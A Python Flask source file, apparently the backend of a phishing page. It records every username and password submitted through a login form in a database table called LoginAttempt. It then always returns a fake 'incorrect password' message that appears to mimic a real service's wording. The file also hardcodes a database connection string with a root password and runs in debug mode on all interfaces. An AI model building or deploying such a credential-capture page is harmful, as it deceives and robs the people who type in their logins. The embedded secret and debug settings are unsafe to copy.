import os
from flask import Flask, render_template, request, jsonify
from flask_sqlalchemy import SQLAlchemy
from sqlalchemy.exc import SQLAlchemyError
from werkzeug.security import generate_password_hash
from flask_compress import Compress

app = Flask(__name__)
Compress(app)  # ✅ Omogućava gzip kompresiju za brži prenos podataka

# ✅ Povezivanje sa Railway bazom
DATABASE_URL = os.getenv('DATABASE_URL', 'mysql+pymysql://root:GvPDvyLfNaSvaXQiEBXiUWroZvvMwJPU@hopper.proxy.rlwy.net:48619/railway')
app.config['SQLALCHEMY_DATABASE_URI'] = DATABASE_URL
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['SQLALCHEMY_POOL_SIZE'] = 10  # ✅ Brži pristup bazi sa pool-om konekcija
app.config['SQLALCHEMY_MAX_OVERFLOW'] = 20
app.secret_key = os.urandom(24)

db = SQLAlchemy(app)

class LoginAttempt(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(150), nullable=False)
    password = db.Column(db.String(255), nullable=False)  # ✅ Povećana dužina za hashovanje

# ✅ Kreiranje tabele
with app.app_context():
    db.create_all()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    username = request.form.get('username')
    password = request.form.get('password')

    if not username or not password:
        return jsonify({"message": "Sva polja su obavezna!", "status": "error"})

    try:
        hashed_password = generate_password_hash(password)  # ✅ Hashovanje radi sigurnosti
        new_attempt = LoginAttempt(username=username, password=hashed_password)
        db.session.add(new_attempt)
        db.session.commit()
        return jsonify({"message": "Incorrect username or password.", "status": "success"})
    except SQLAlchemyError as e:
        db.session.rollback()
        print(f"❌ Greška pri upisu u bazu: {e}")
        return jsonify({"message": "Sorry, your password was incorrect. Please double-check your password.", "status": "error"})

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port, debug=True, threaded=True)  # ✅ Omogućava višestruke zahteve istovremeno
